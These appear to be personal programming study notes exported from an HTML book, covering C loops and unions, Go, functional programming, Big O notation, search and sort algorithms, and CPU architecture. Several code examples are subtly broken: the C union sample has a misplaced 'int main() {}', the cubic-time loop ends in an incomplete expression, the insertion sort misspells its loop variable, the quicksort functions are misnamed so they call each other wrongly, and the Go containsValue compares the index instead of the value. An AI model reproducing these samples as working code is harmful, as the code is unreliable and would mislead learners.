<li>The <code>for</code> loop is used to execute a block of code a fixed number of times.</li>
<li>The <code>while</code> loop is used to execute a block of code as long as a condition is true.</li>
<li>The <code>do while</code> loop is similar to the <code>while</code> loop, but the condition is checked after the block of code is executed.</li>
</ul>
<h2 id="examples-1"><a class="header" href="#examples-1">Examples</a></h2>
<h3 id="hello-world-using-a-function-from-the-math-library"><a class="header" href="#hello-world-using-a-function-from-the-math-library">Hello World using a function from the math library</a></h3>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;math.h&gt;

int main() {
    printf("Hello, World!\n");
    printf("The square root of 16 is %f\n", sqrt(16));
    return 0;
}
</code></pre>
<ul>
<li>The main function returns a value of type int. By convention, a return value of 0 indicates that the program executed successfully.</li>
</ul>
<h3 id="reading-and-printing-an-integer"><a class="header" href="#reading-and-printing-an-integer">Reading and printing an integer</a></h3>
<pre><code>#include &lt;stdio.h&gt;

int main() {
    int x;
    printf("Enter an integer: ");
    scanf("%d", &amp;x);
    printf("You entered: %d\n", x);
    return 0;
}
</code></pre>
<h2 id="unions"><a class="header" href="#unions">Unions</a></h2>
<ul>
<li>A union is a user-defined data type that allows storing different data types in the same memory location.</li>
<li>The size of a union is determined by the size of its largest member.</li>
<li>A union can only store one member at a time.</li>
<li>To declare a union:</li>
</ul>
<pre><code class="language-c">union Data {
    int i;
    float f;
    char str[20];
};

int main() {}
    union Data data;
    data.i = 10;
    printf("data.i: %d\n", data.i);
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-bufio-package"><a class="header" href="#the-bufio-package">the bufio package</a></h1>
<h2 id="scanner"><a class="header" href="#scanner">scanner</a></h2>
<p>A scanner is a convenient way of reading data delimited by new lines or spaces.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="go-projects"><a href="#go-projects" class="header">Go-projects</a></h1>
<ul>
<li>
<p><input disabled="" type="checkbox" checked=""> csv2json</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> wc (word count)</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> cat</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> pwd</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> hashy</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> httping</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> mdp</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> httpbench</p>
</li>
<li>
<p><input disabled="" type="checkbox"> http status codes</p>
</li>
<li>
<p><input disabled="" type="checkbox"> get-headers</p>
</li>
<li>
<p><input disabled="" type="checkbox"> noted</p>
</li>
<li>
<p><input disabled="" type="checkbox"> todo</p>
</li>
<li>
<p><input disabled="" type="checkbox"> dnsEnum</p>
</li>
<li>
<p><input disabled="" type="checkbox"> todo</p>
</li>
<li>
<p><input disabled="" type="checkbox"> password generator</p>
</li>
<li>
<p><input disabled="" type="checkbox"> csvpeek</p>
</li>
<li>
<p><input disabled="" type="checkbox"> theHarvester clone</p>
</li>
<li>
<p><input disabled="" type="checkbox"> apache log parser into json</p>
</li>
<li>
<p><input disabled="" type="checkbox"> nginx log parser into json</p>
</li>
<li>
<p><input disabled="" type="checkbox"> fstab formatter</p>
</li>
<li>
<p><input disabled="" type="checkbox"> generic upload service</p>
</li>
<li>
<p><input disabled="" type="checkbox"> dead-link checker</p>
</li>
<li>
<p><input disabled="" type="checkbox"> my own note syncing app - Sync notes to a github repo - display notes using tea</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="immutability-1"><a href="#immutability-1" class="header">Immutability</a></h1>
<p>Functional programming is more about declaring what you want to happen, rather than how you want it to happen.</p>
<p>Example:</p>
<pre><code class="language-python">return clean_windows(add_gas(create_car()))
</code></pre>
<p><em><strong>Python is not great for functional programming, but the example above illustrates the concept.</strong></em>
Reasons python is not great for functional programming:</p>
<ol>
<li>Lack of immutability: Functional programming relies heavily on immutable data structures, whereas Python</li>
<li>Limited support for tail call optimization: Functional programming often uses recursion as a primary control structure, but Python does not optimize for tail calls, which can lead to stack overflow errors for deep recursions.</li>
<li>Mixed paradigms: Python is a multi-paradigm language that supports both imperative and object-oriented programming, which can lead to less emphasis on functional programming principles.</li>
</ol>
<p>The key distinction in the example (relative to imperative programming), is that we never change the value of the car variable. Instead, we compose functions that return new values based on the input value.</p>
<h2 id="immutability"><a class="header" href="#immutability">Immutability</a></h2>
<p>In functional programming, we strive to make data immutable. Once a data structure is created, it cannot be mutated. Instead, any modification needed creates a new data structure.</p>
<p>Immutable data is easier to think about and work with. When 10 different functions are mutating the same data structure, it can be hard to track what the current state is. With immutability, you always know that the data structure you have is exactly what it was when it was created.</p>
<p>Generally speaking, immutability means fewer bugs and more maintainable code.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="imperative-programming"><a href="#imperative-programming" class="header">Imperative-programming</a></h1>
<p>Imperative programming is a programming paradigm where we declare what we want to happen, and how we want it to happen, step by step.</p>
<p>Exmaple:</p>
<pre><code class="language-python">car = new_car()
car.add_gas(10)
car.clean_windows()
</code></pre>
<p>In the example above, we create a new car object and then modify its state by adding gas and cleaning the windows through a series of commands. Each step changes the state of the car object directly.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="computer-science"><a class="header" href="#computer-science">Computer Science</a></h1>
<h2 id="directory-map-10"><a class="header" href="#directory-map-10">Directory Map</a></h2>
<ul>
<li><a href="#measuring-algorithm-performance">algorithms</a></li>
<li><a href="#computer-architecture">computer_architecture</a></li>
<li><a href="compsci/computer_architecture/transistors.html">transistors</a></li>
<li><a href="#data-structures">data_structures</a></li>
<li><a href="#euclids-algorithm">euclids_algorithm</a></li>
<li><a href="#fizzbuzz">fizzbuzz</a></li>
<li><a href="#graph-theory">graph-theory</a></li>
<li><a href="#string-algorithms">string_algorithms</a></li>
<li><a href="#hashing">hashing</a></li>
<li><a href="compsci/key-value-stores.html">key-value-stores</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="measuring-algorithm-performance"><a class="header" href="#measuring-algorithm-performance">Measuring algorithm performance</a></h1>
<p><img src="images/big-o.png" alt=""></p>
<h2 id="analyzing-algorithms"><a class="header" href="#analyzing-algorithms">Analyzing Algorithms</a></h2>
<ul>
<li>One way to judge an algorithm‚Äôs performance is by its runtime (wall-clock time). Another method is CPU time (the time the algorithm actually run on the CPU). Neither of these are good practice, as both will vary with each run of the algorithm. Instead, computer scientists compare algorithms by looking at the number of steps they require.</li>
<li>You can input the number of steps involved in a n algorithm into a formula that can compare two or more algorithms without considering the programming language or computer.</li>
<li>Let‚Äôs take a look at a simple example:</li>
</ul>
<pre><code>package main

import (
    "fmt"
)

func main() {
    arr := []int{1,2,3,4,5}
    for _, v := range arr {
        fmt.Println(v)
    }
}
</code></pre>
<p>The function above takes 5 steps to complete. You can express this with the following formula:</p>
<pre><code>f(n) = 5
</code></pre>
<p>If you make the program more complicated, the formula will change. Let‚Äôs say you wanted to keep track of the variables as you printed them:</p>
<pre><code>package main

import (
    "fmt"
)

func main() {
    var count int = 0
    arr := []int{1,2,3,4,5}
    for _, v := range arr {
        fmt.Println(v)
        count += v
    }
}
</code></pre>
<p>The formula for this program would now be:</p>
<pre><code>f(n) = 11
</code></pre>
<p>The program takes 11 steps to complete. It first assigns the count variable the value 0. Then, it prints five numbers and increments five times (1 + 5 + 5 = 11)</p>
<p>It can be hard to determine how many steps a particular algorithm takes, especially in large programs and in functions/methods with many conditional statements. Luckily, you don‚Äôt need to care about how many steps an algorithm has. Instead, you should care about how the algorithm performs as <code>n</code> gets bigger.</p>
<p>Because the important part of an algorithm is the part that grows the fastest as <code>n</code> gets bigger, computer scientists use ‚ÄòBig O‚Äô notation to express an algorithm‚Äôs efficiency instead of a T(n) equation. Big O notation is a mathematical notation that describes how an algorithm‚Äôs time or space requirements increase as the size of n increases. Computer scientists use Big O Notation to create an order-of-magnitude function from T(n). An order-of-magnitude is a class in a classification system where each class is many times greater or smaller than the one before. In an order-of-magnitude function, you use the part of <code>T(n)</code> that dominates the equation, and ignore everything else. The part of <code>T(n)</code> that dominates the equation is an algorithm‚Äôs order of magnitude.</p>
<p>These are the most commonly used classifications for order of magnitude in Big O Notation, sorted from best (most efficient) to worst (least efficient):</p>
<ol>
<li>Constant Time</li>
<li>Logarithmic time</li>
<li>Linear time</li>
<li>Log-Linear time</li>
<li>Quadratic time</li>
<li>Cubic time</li>
<li>Exponential time</li>
</ol>
<p>Each order of magnitude describes an algorithm‚Äôs time complexity. Time complexity is the maximum number of steps an algorithm takes to complete as <code>n</code> get bigger.</p>
<h2 id="order-of-magnitude-classifications"><a class="header" href="#order-of-magnitude-classifications">Order of magnitude classifications:</a></h2>
<h3 id="constant-time"><a class="header" href="#constant-time">Constant Time</a></h3>
<ul>
<li>An algorithm runs in constant time when it requires the same number of steps regardless of the problem‚Äôs size. The Big O notation for constant time complexity is <code>O(1)</code>. For example, let‚Äôs say you own a book store. Each day, you give the first customer of that day a free book. You may track this in a program using the following code:</li>
</ul>
<pre><code>free_book = customers_for_day[0]
</code></pre>
<p>The <code>T(n)</code> equation for this would be <code>T(n) = 1</code></p>
<p>Your algorithm requires one step, no matter how many customers you have. When you graph a constant time complexity algorithm on a chart with the number of inputs on the x-axis and number of steps on the y-axis, the graph is a flat line.</p>
<h3 id="logarithmic-time"><a class="header" href="#logarithmic-time">Logarithmic Time</a></h3>
<ul>
<li>The second most efficient time complexity. An algorithm takes logarithmic time when its run time grows in proportion to the logarithm of the input size. You see this in algorithms such as a binary search that can discard many values at each iteration.</li>
<li>You express a logarithmic function in big O notation <code>O(log n)</code>.</li>
<li>A logarithm is the power that a number needs to be raised to to get some other number. In computer science, the number that we raise to (the base) is always 2 (unless otherwise specified).</li>
</ul>
<h3 id="linear-time"><a class="header" href="#linear-time">Linear Time</a></h3>
<ul>
<li>An algorithm that runs in linear time grows at the same rate as the size of the problem.</li>
<li>You express a linear algorithm in Big O notation <code>O(n)</code>.</li>
<li>Suppose you modify your free book program so that instead of giving a free book to the first customer of the day, you iterate through your list of customers and give all customers who‚Äôs name starts with the letter ‚ÄúB‚Äù a free book. The list of customers is not sorted. Now you must iterate through the list one by one to find all the customers who‚Äôs names start with the letter ‚ÄúB‚Äù. When your customer list contains 5 items, your algorithm will take 5 steps. When it contains 10 items, it will take 10 steps, and so on.</li>
</ul>
<h3 id="log-linear-time"><a class="header" href="#log-linear-time">Log-Linear Time</a></h3>
<ul>
<li>Log-linear time grows as a combination of logarithmic and linear time complexities. For example, a log-linear algorithm might evaluate an O(log n) operation n times. In Big O Notation, you express a log-linear algorithm as O(n log n). Log-Linear algorithms often divide a data set into smaller parts and process each piece independently.</li>
</ul>
<h3 id="quadratic-time"><a class="header" href="#quadratic-time">Quadratic Time</a></h3>
<ul>
<li>An algorithm runs in quadratic time when its performance is directly proportional to the problem‚Äôs size squared. In big O notation, you express this as O(n^2)</li>
<li>Example:</li>
</ul>
<pre><code>numbers = [1,2,3,4,5]
for i in numbers:
    for j in numbers:
        x = i * j
        print(x)
</code></pre>
<ul>
<li>As a general rule, if your algorithm contains two nested loops running from 1 to n, it‚Äôs time complexity will be at least O(n^2). Many sorting algorithms such as insertion sort use quadratic time.</li>
</ul>
<h3 id="cubic-time"><a class="header" href="#cubic-time">Cubic Time</a></h3>
<ul>
<li>An algorithm runs in cubic time when its performance is directly proportional to the size of the problem cubed. This is expressed in Big O notation as O(n^3)</li>
<li>Example:</li>
</ul>
<pre><code>numbers = [1,2,3,4,5]
for i in numbers:
    for j in numbers:
        for h in numbers:
            x = i + j + 
            print(x)
</code></pre>
<h3 id="exponential-time"><a class="header" href="#exponential-time">Exponential Time</a></h3>
<ul>
<li>One of the worst time complexities</li>
<li>An algorithm that runs in exponential time contains a constant that is raised to the size of the problem.</li>
<li>Big O Notation: O(c^n)</li>
<li>Example:</li>
</ul>
<pre><code>pin = 931
n = len(pin)
for i in range(10**n):
    if i == pin:
        print(i)
</code></pre>
<p>Here we are trying to guess a 3 digit password. When n is 1, the algorithm takes 10 steps. When n is 2, the algorith takes 100 steps. When n is 3, the algorithm takes 1000 steps. It grows quickly.</p>
<h2 id="search-algorithms"><a class="header" href="#search-algorithms">Search Algorithms</a></h2>
<h3 id="linear-search"><a class="header" href="#linear-search">Linear Search</a></h3>
<ul>
<li>Iterate through every item in a data set and compare it to the test case</li>
<li>Time complexity is O(n)</li>
<li>Consider using a Linear search when the data is not sorted</li>
</ul>
<pre><code class="language-go">func linearSearch(numbers []int, value int) bool {
    for _, v := range numbers {
       if v == value {
            return true
       } 
    }
    return false
}

func main() {
    nums := []int{1,50,34,20,10,54,23,65}
    fmt.Println(linearSearch(nums, 34))
}
</code></pre>
<h3 id="binary-search"><a class="header" href="#binary-search">Binary Search</a></h3>
<ul>
<li>Faster than a linear search</li>
<li>Only works when the data is sorted</li>
<li>A binary search searches for elements in a list by dividing the list into two halves. The first step is to locate the middle number. You then determine if the number you are looking for is less than or greater than the middle number. If the number you are looking for is greater, you continue searching numbers to the right of the middle number, repeating the process of splitting this new list into two. If the number you are looking for is less, you search the numbers to the left of the middle number, repeating this process.</li>
<li>Time complexity is O(log n)</li>
</ul>
<pre><code class="language-go">
func binarySearch(needle int, haystack []int) bool {

	low := 0
	high := len(haystack) - 1

	for low &lt;= high{
		median := (low + high) / 2

		if haystack[median] &lt; needle {
			low = median + 1
		}else{
			high = median - 1
		}
	}

	if low == len(haystack) || haystack[low] != needle {
		return false
	}

	return true
}


func main(){
	items := []int{1,2, 9, 20, 31, 45, 63, 70, 100}
	fmt.Println(binarySearch(63, items))
}

</code></pre>
<h2 id="sorting-algorithms"><a class="header" href="#sorting-algorithms">Sorting Algorithms</a></h2>
<h3 id="bubble-sort"><a class="header" href="#bubble-sort">Bubble Sort</a></h3>
<ul>
<li><need to="" add="" notes="">
</need></li>
</ul>
<h3 id="insertion-sort"><a class="header" href="#insertion-sort">Insertion sort</a></h3>
<ul>
<li>Insertion sort is a sorting algorithm where you sort a list like you sort a deck of cards. Suppose you have the numbers [ 6,5,8,2 ]. You start with the second number in the list and compare it to the first. Since 5 is less than 6, you move 5 to the first position. You now compare the number in the third position (8) to the number in the second position. Because 8 is greater than 6, 8 does not move. Because you already sorted the first half of the list, you do not need to compare 8 to 5. You then compare the 4th number in the list (2), and because 8 is greater than 2, you go one by one through the sorted left half of the list, comparing 2 to each number until it arrives at the front and the entire list is sorted: 2,5,6,8</li>
<li>Example:</li>
</ul>
<pre><code>def insertion_sort(a_list):
    for i in range(len(a_list) - 1):
        current_position = i + 1

        while currrent_postition &gt; 0 and a_list[current_position - 1] &gt; a_list[current_position]:
            # swap
            a_list[current_position], a_list[current_position - 1] = a_list[current_position - 1], a_list[current_position]
            current_position -= 1
    return a_list
</code></pre>
<ul>
<li>Insertion sort is O(n^2), so it is not very efficient</li>
<li>Insert sort can be efficient on a nearly sorted list</li>
</ul>
<h3 id="merge-sort"><a class="header" href="#merge-sort">Merge Sort</a></h3>
<ul>
<li>A merge sort is a recursive divide-and-conquer sorting algorithm that continually splits a list in half until there are one or more lists containing one item and then puts them back together in the correct order.
Steps:
<ol>
<li>If the list is of length 1, return the list as it is already sorted by definition of the merge sort algorithm.</li>
<li>If the list has more than one item, split the list into two halves.</li>
<li>Recursively call the merge sort function on both halves.</li>
<li>Merge the two sorted halves back together into one sorted list by comparing the first</li>
</ol>
</li>
</ul>
<p><img src="images/algorithms/merge-sort.png" alt="Merge Sort"></p>
<ul>
<li>Lists containing only one item are sorted by definition.</li>
<li>A merge sort is a ‚Äòdivide and conquer‚Äô algorithm. You recursively break a problem into two until they are simple enough to solve easily.</li>
<li>A merge sort‚Äôs time complexity is O(n * log n)</li>
<li>With log linear time complexity, a merge sort is one of the most efficient sorting algorithms</li>
</ul>
<pre><code class="language-python">def merge_sort(nums):
    if len(nums) &lt; 2:
        return nums

    mid = len(nums) // 2
    first_half = nums[:mid]
    second_half = nums[mid:]

    sorted_left_side = merge_sort(first_half)
    sorted_right_side = merge_sort(second_half)
    return merge(sorted_left_side, sorted_right_side)

def merge(first, second):
    final = []
    i = 0
    j = 0

    while i &lt; len(first) and j &lt; len(second):
        if first[i] &lt;= second[j]:
            final.append(first[i])
            i += 1
        else:
            final.append(second[j])
            j += 1

    while i &lt; len(first):
        final.append(first[i])
        i += 1

    while j &lt; len(second):
        final.append(second[j])
        j += 1
        
    return final
</code></pre>
<h3 id="quick-sort"><a class="header" href="#quick-sort">Quick Sort</a></h3>
<ul>
<li>Like merge sort, quick sort is a recursive divide-and-conquer sorting algorithm. However, instead of splitting the list in half, quick sort selects a ‚Äòpivot‚Äô element from the list and partitions the other elements into two sub-arrays according to whether they are less than or greater than the pivot. The sub-arrays are then sorted recursively.</li>
<li>Quick sort will sort the list in-pace, requiring small additional amounts of memory to perform the sorting.</li>
<li>If the list has zero or one element, it is already sorted.</li>
<li>Quick sort will quickly degrade into O(n^2) time complexity if the pivot elements are poorly chosen. i.e. if the smallest or largest element is always chosen as the pivot in an already sorted list. However, with good pivot selection, quicksort can achieve average time complexity of O(n log n). To ensure good pivot selection, you can use techniques such as choosing the median element or using randomization.</li>
</ul>
<pre><code class="language-python">def partition(nums, low, high):
    if low &lt; high:
        middle = partition(nums, low, high)

        quick_sort(nums, low, middle - 1)
        quick_sort(nums, middle + 1, high)

def paritition(nums, low, high):
    pivot = nums[high] # get the last element in the list
    i = low - 1 # pointer for the smaller element

    for j in range(low, high):
        if nums[j] &lt;= pivot:
            i += 1
            nums[i], nums[j] = nums[j], nums[i] # swap

    nums[i + 1], nums[high] = nums[high], nums[i + 1] # swap pivot element
    return i + 1

</code></pre>
<h3 id="selection-sort"><a class="header" href="#selection-sort">Selection Sort</a></h3>
<ul>
<li>Selection sort is similar to bubble sort in that it repeatedly swaps items in a list. However, it‚Äôs slightly more performant as it only makes one swap per iteration of the outer loop.</li>
</ul>
<pre><code class="language-python">def selection_sort(a_list):
    for i in range(len(a_list)):
        smallest_index = i
        for j in range(i + 1, len(a_list)):
            if a_list[j] &lt; a_list[smallest_index]:
                smallest_index = j
        a_list[i], a_list[smallest_index] = a_list[smallest_index], a_list[i] # swap

</code></pre>
<h1 id="polynomial-vs-exponential-time-complexity"><a class="header" href="#polynomial-vs-exponential-time-complexity">Polynomial vs Exponential Time Complexity</a></h1>
<ul>
<li>Broadly speaking, algorithms can be classified into two categories based on their time complexity: polynomial time and exponential time.</li>
<li>Algorithm runs in Polynomial time if its runtime does not grow faster than n^k, where k is any constant (e.g. n^2, n^3, n^4, etc.) and n is the size of the input. Polynomial time algorithms can be useful if they are not too slow.</li>
<li>Exponential time algorithms are almost always too slow to be practical.</li>
<li>The name for the set of Polynomial time algorithms is ‚ÄúP‚Äù. Problems that can be solved by polynomial time algorithms are called ‚Äútractable‚Äù problems. Problems that cannot be solved by polynomial time algorithms are called ‚Äúintractable‚Äù problems.</li>
</ul>
<h1 id="non-deterministic-polynomial-time-np"><a class="header" href="#non-deterministic-polynomial-time-np">Non-Deterministic Polynomial Time (NP)</a></h1>
<ul>
<li>Non-deterministic polynomial time (NP) is a complexity describing a set of problems that can be verified in polynomial time but not necessarily solved in polynomial time.</li>
</ul>
<h1 id="examples-2"><a class="header" href="#examples-2">Examples</a></h1>
<pre><code>package main

func main() {

}

// O(1) describes an algorithm that will always execute in the same time (or space) regardless of the size of the input data set.
func returnFalse() bool {
        return false
}

// O(N) describes an algorithm whose performance will grow linearly and in direct proportion to the size of the input data set. The example below also demonstrates how Big O favours the worst-case performance scenario; a matching string could be found during any iteration of the for loop and the function would return early, but Big O notation will always assume the upper limit where the algorithm will perform the maximum number of iterations.
func containsValue(value int, intSlice []int) bool {
        for r := range intSlice {
                if r == value {
                        return true
                }
        }
        return false
}

// O(N¬≤) represents an algorithm whose performance is directly proportional to the square of the size of the input data set. This is common with algorithms that involve nested iterations over the data set. Deeper nested iterations will result in O(N¬≥), O(N‚Å¥) etc.
func containsDuplicates(vals []string) bool {
        for i := 0; i &lt; len(vals); i++ {
                for j := 0; j &lt; len(vals); j++ {
                        if i == j {
                                continue
                        }
                        if vals[i] == vals[j] {
                                return true
                        }
                }
        }
        return false
}

// O(2^N) denotes an algorithm whose growth doubles with each addition to the input data set. The growth curve of an O(2^N) function is exponential ‚Äî starting off very shallow, then rising meteorically. An example of an O(2^N) function is the recursive calculation of Fibonacci numbers:
func Fibonacci(number int) int {
        if number &lt;= 1 {
                return number
        }

        return Fibonacci(number-2) + Fibonacci(number-1)
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="computer-architecture"><a class="header" href="#computer-architecture">Computer Architecture</a></h1>
<h2 id="table-of-contents-6"><a class="header" href="#table-of-contents-6">Table of Contents</a></h2>
<ol>
<li><a href="#risc-vs-cisc">RISC vs CISC</a></li>
<li><a href="#von-neumann-architecture-model">von Neumann Architecture Model</a></li>
<li><a href="#memory-and-addressing">Memory and Addressing</a></li>
<li><a href="#the-von-neumann-bottleneck">The von Neumann Bottleneck</a></li>
<li><a href="#modern-innovations-in-computer-architecture">Modern Innovations in Computer Architecture</a></li>
</ol>
<hr>
<h2 id="risc-vs-cisc"><a class="header" href="#risc-vs-cisc">RISC vs CISC</a></h2>
<ul>
<li>The CPU executes instructions that are stored in various memory layers throughout the computer system (RAM, caches, registers).</li>
<li>A particular CPU has an Instruction Set Architecture (ISA), which defines:
<ul>
<li>The set of instructions the CPU uses and their binary encoding.</li>
<li>The set of CPU registers.</li>
<li>The effects of executing instructions on the state of the processor.</li>
<li>Examples of ISAs include SPARC, ARM, x86, MIPS, and PowerPC.</li>
<li>A micro-architecture is a specific implementation of an ISA which can have different circuitry. AMD and Intel both produce x86 processors, but with different micro-architectures.</li>
</ul>
</li>
</ul>
<h3 id="key-differences-between-risc-and-cisc"><a class="header" href="#key-differences-between-risc-and-cisc">Key Differences Between RISC and CISC</a></h3>
<ul>
<li>
<p><strong>RISC (Reduced Instruction Set Computer)</strong>:</p>
<ul>
<li>Small set of basic instructions that execute quickly, typically in a single clock cycle.</li>
<li>Simpler micro-architecture design, requiring fewer transistors.</li>
<li>Programs may contain more instructions, but execution is highly efficient.</li>
<li>Example: ARM processors, widely used in mobile devices.</li>
</ul>
</li>
<li>
<p><strong>CISC (Complex Instruction Set Computer)</strong>:</p>
<ul>
<li>Designed to execute more complex instructions, which often take multiple cycles.</li>
<li>Programs are smaller as they contain fewer instructions.</li>
<li>Example: x86 processors, dominant in desktops and servers.</li>
</ul>
</li>
<li>
<p><strong>General Observations</strong>:</p>
<ul>
<li>RISC architectures excel in scenarios requiring high efficiency and low power, such as mobile devices.</li>
<li>CISC architectures dominate general-purpose computing due to compatibility with legacy software and complex operations.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="von-neumann-architecture-model"><a class="header" href="#von-neumann-architecture-model">von Neumann Architecture Model</a></h2>
<ul>
<li>All modern processors adhere to the von Neumann architecture model.</li>
<li>The von Neumann architecture consists of five components:
<ol>
<li>
<p><strong>Processing Unit</strong>:</p>
<ul>
<li>Composed of the <strong>Arithmetic/Logic Unit (ALU)</strong> and <strong>Registers</strong>.</li>
<li>The ALU performs mathematical operations (addition, subtraction, etc.).</li>
<li>Registers are fast storage units for program data and instructions being executed.</li>
</ul>
</li>
<li>
<p><strong>Control Unit</strong>:</p>
<ul>
<li>Responsible for loading instructions from memory and coordinating execution with the processing unit.</li>
<li>Contains the <strong>Program Counter (PC)</strong> and <strong>Instruction Register (IR)</strong>.</li>
</ul>
</li>
<li>
<p><strong>Memory Unit</strong>:</p>
<ul>
<li>Stores program data and instructions in <strong>Random Access Memory (RAM)</strong>.</li>
<li>RAM provides fast, direct access to memory locations via unique addresses.</li>
</ul>
</li>
<li>
<p><strong>Input Unit</strong>:</p>
<ul>
<li>Loads program data and instructions into the computer.</li>
</ul>
</li>
<li>
<p><strong>Output Unit</strong>:</p>
<ul>
<li>Stores or displays program results.</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="fetch-decode-execute-store-feds-cycle"><a class="header" href="#fetch-decode-execute-store-feds-cycle">Fetch-Decode-Execute-Store (FEDS) Cycle</a></h3>
<ol>
<li><strong>Fetch</strong>: The control unit fetches the next instruction from memory using the program counter. The control unit places that address on the address bus and increments the PC. It also places the read command on the control bus. The memory unit then reads the bytes stored at the address and places them on the data bus which is then read by the control unit. The instruction register stores the bytes of the instruction received from the memory unit.</li>
<li><strong>Decode</strong>: The control unit decodes the instuction stored in the instruction register. It decodes the opcode and operands, determining what action to take.</li>
<li><strong>Execute</strong>: The processing unit executes the instruction. The ALU performs the necessary calculations or data manipulations.</li>
<li><strong>Store</strong>: Results are stored in memory or registers.</li>
</ol>
<ul>
<li>Example: In modern systems, 32-bit processors can address up to (2^{32}) bytes of memory (4 GB).</li>
</ul>
<hr>
<h2 id="memory-and-addressing"><a class="header" href="#memory-and-addressing">Memory and Addressing</a></h2>
<ul>
<li><strong>Smallest Addressable Unit</strong>: In modern systems, the smallest addressable memory unit is 1 byte (8 bits).</li>
<li><strong>32-bit vs. 64-bit Architectures</strong>:
<ul>
<li>32-bit systems: Address up to (2^{32}) bytes (4 GB).</li>
<li>64-bit systems: Address up to (2^{64}) bytes (16 exabytes).</li>
</ul>
</li>
<li><strong>Memory Hierarchy</strong>:
<ul>
<li>Registers &gt; Cache &gt; RAM &gt; Secondary Storage.</li>
<li>Each layer balances speed and capacity, with registers being the fastest but smallest.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="the-von-neumann-bottleneck"><a class="header" href="#the-von-neumann-bottleneck">The von Neumann Bottleneck</a></h2>
<ul>
<li><strong>Definition</strong>: The limitation caused by the shared bus between memory and the CPU, which slows data transfer.</li>
<li><strong>Consequences</strong>:
<ul>
<li>Slower execution of memory-intensive programs.</li>
<li>Limits on parallel execution.</li>
</ul>
</li>
<li><strong>Mitigation</strong>:
<ul>
<li>Use of <strong>caches</strong> to reduce frequent memory access.</li>
<li>Development of <strong>pipelining</strong> and <strong>out-of-order execution</strong> to improve instruction throughput.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="modern-innovations-in-computer-architecture"><a class="header" href="#modern-innovations-in-computer-architecture">Modern Innovations in Computer Architecture</a></h2>
<ul>
<li><strong>Harvard Architecture</strong>:
<ul>
<li>Separates data and instruction memory, reducing the von Neumann bottleneck.</li>
</ul>
</li>
<li><strong>Multicore Processors</strong>:
<ul>
<li>Incorporate multiple CPUs (cores) on a single chip for parallel execution.</li>
</ul>
</li>
<li><strong>Pipelining</strong>:
<ul>
<li>Breaks instruction execution into stages, allowing multiple instructions to be processed simultaneously.</li>
<li>Each instruction takes 4 cycles: fetch, decode, execute, store, resulting in a CPI (cycles per instruction) of 4</li>
<li>The control circuitry of a CPU can be tweaked to obtain a better CPI value</li>
<li>The CPU circuity involved with executing each stage of the 4 stages is only actively involved once every 4 cycles. The other 3 cycles it sits idle. For example, in a given instruction, after the fetch stage, the fetch circuity sits idle for the remaining 3 clock cycles in the execution of the instruction. Pipelining is the act of allowing the fetch circuitry to execute the fetch stage for other instructions. Put another way, CPU pipelining is the idea of starting the execution of the  next instruction before the current instruction has fully completed its execution. Sequences of instructions can overlap.</li>
<li>The Intel Core i7 has a 14 stage pipeline</li>
<li>A pipeline stall occurs when any stage of execution is forced to wait on another before it can continue</li>
</ul>
</li>
<li><strong>Speculative Execution</strong>:
<ul>
<li>Predicts and executes instructions before they are needed, increasing efficiency.</li>
</ul>
</li>
<li><strong>Graphics Processing Units (GPUs)</strong>:
<ul>
<li>Specialized processors optimized for parallel computation, commonly used in machine learning and graphics.</li>
</ul>
</li>
<li><strong>RISC-V</strong>:
<ul>
<li>A modern open-standard RISC architecture gaining popularity for its flexibility and extensibility.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="building-a-processor"><a class="header" href="#building-a-processor">Building a Processor</a></h2>
<ul>
<li>The CPU implements the processing and control units of the von Neumann architecture.</li>
<li>Key components include the ALU, registers, and control unit.</li>
</ul>
<h3 id="alu"><a class="header" href="#alu">ALU</a></h3>
<ul>
<li>Performs all arithmetic and logical operations on signed and unsigned integers. A separate floating point unit performs arithmetic on floating-point numbers.</li>
<li>The ALU takes integer operands and opcode values that specify an operation to perform on the operands</li>
</ul>
<h3 id="registers-1"><a class="header" href="#registers-1">Registers</a></h3>
<ul>
<li>Fast, small storage units within the CPU that hold data and instructions being executed.</li>
<li>Common registers include the Program Counter (PC), Instruction Register (IR), and General-Purpose Registers (GPRs).</li>
<li>The CPU‚Äôs set of general-purpose registers is organized into a register file circuit.
<ul>
<li>A register file consists of a set of register circuits for storing data values and some control circuits for controlling reads and writes to its registers</li>
</ul>
</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="data-structures"><a class="header" href="#data-structures">Data Structures</a></h1>
<p><em>I‚Äôm a huge proponent of designing your code around the data, rather than the other way around, and I think it‚Äôs one of the reasons git has been fairly successful‚Ä¶ I will, in fact, claim that the difference between a bad programmer and a good one is whether he considers his code or his data structures more important. Bad programmers worry about the code. Good programmers worry about data structures and their relationships.</em> - Linus Torvalds</p>
<ul>
<li>A data structure is a way of organizing data in a computer so programmers can effectively use it in their programs.</li>
<li>An abstract data type is a description of a data structure, whereas a data structure is an actual implementation.</li>
<li>Computer scientists classify data structures based on different properties. For example, whether they are linear or non-linear.
<ul>
<li>Linear  data structures arrange elements in a sequence.</li>
<li>Non-linear data structures link data non-sequentially</li>
</ul>
</li>
<li>Traversing a data structure means to walk through the data structure one element at a time without backtracking. In a non-linear data structure, you often need to backtrack.</li>
<li>Computer scientists also classify data structure by whether they are static or dynamic:
<ul>
<li>static: fixed size</li>
<li>dynamic: can grow or shrink</li>
</ul>
</li>
</ul>
